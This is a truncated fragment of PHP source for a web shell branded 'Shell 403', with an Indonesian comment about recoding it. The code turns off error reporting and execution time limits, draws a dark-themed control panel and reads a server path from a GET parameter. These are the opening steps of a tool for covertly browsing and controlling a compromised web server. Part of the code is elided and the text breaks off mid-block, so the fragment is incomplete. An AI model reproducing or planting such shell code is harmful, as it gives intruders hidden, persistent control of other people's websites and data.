<?php
/* Mau recode? izin dulu, recode ga izin itu ga keren ajg, but who care? */
set_time_limit(0);
error_reporting(0); 
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary anu'>Shikimori San<3 </div>
				<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>$_n Shell 403</h4></a>";
				if(isset($_GET['path'])){
					$path = $_GET['path'];
				}else{
					$path = getcwd();
